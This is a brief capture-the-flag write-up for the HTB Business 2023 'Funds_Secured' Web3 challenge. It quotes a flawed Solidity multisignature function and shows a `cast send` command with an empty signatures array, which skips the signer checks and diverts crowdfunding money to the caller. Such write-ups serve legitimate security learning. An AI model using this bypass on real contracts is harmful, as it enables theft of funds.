#HTB Business 2023 : Funds_Secured (Web3)
***
### Details :
First of all, the contract relays on a function to ensure multisignature from 6 members of a list.
***
### Goal :
Our goal is to trick the following function in order to steal funds from the crowdfunding campaign :

```solidity
function closeCampaign(bytes[] memory signatures, address to, address payable crowdfundingContract) public {
        address[] memory voters = new address[](6);
        bytes32 data = keccak256(abi.encode(to));

        for (uint256 i = 0; i < signatures.length; i++) {
            // Get signer address
            address signer = data.toEthSignedMessageHash().recover(signatures[i]);

            // Ensure that signer is part of Council and has not already signed
            require(signer != address(0), "Invalid signature");
            require(_contains(councilMembers, signer), "Not council member");
            require(!_contains(voters, signer), "Duplicate signature");

            // Keep track of addresses that have already signed
            voters[i] = signer;
            // 6 signatures are enough to proceed with `closeCampaign` execution
            if (i > 5) {
                break;
            }
        }

        Crowdfunding(crowdfundingContract).closeCampaign(to);
    }
```
***
### Exploit !
After struggle, i finally found the function only do the different checks into a for loop that takes the size of the array as input.

What if ```i``` was never > 0 ?

```bash
klm@KLM:~$ cast send $WAL "closeCampaign(bytes[],address,address)" [] 0xA5c40B401B57b2aa11C8D17cbfeb343A65c63d69 $CROWD --rpc-url=$RPC --private-key=$PK
```

Enjoy ! ```HTB{XXXXXXXXXXXXX}```